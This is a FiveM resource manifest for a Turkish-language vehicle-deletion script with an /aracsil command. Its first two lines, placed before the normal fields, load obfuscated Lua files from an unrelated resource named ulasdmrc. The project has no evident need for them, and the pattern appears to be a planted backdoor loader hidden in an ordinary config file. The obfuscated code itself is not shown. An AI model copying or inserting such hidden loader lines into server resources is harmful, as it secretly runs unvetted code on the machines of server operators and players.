shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'
fx_version 'bodacious'
game 'gta5'
author 'ELUSED'
description '/aracsil ile sunucudaki araçları silersin'
version 'v1.1.1'
server_script {
    'config.lua',
    'server/server.lua',
    'version.lua'
}
client_scripts {
    'config.lua',
    'client/client.lua',
    'client/entityiter.lua'
}
lua54 'yes'

escrow_ignore {
    'config.lua'
  }
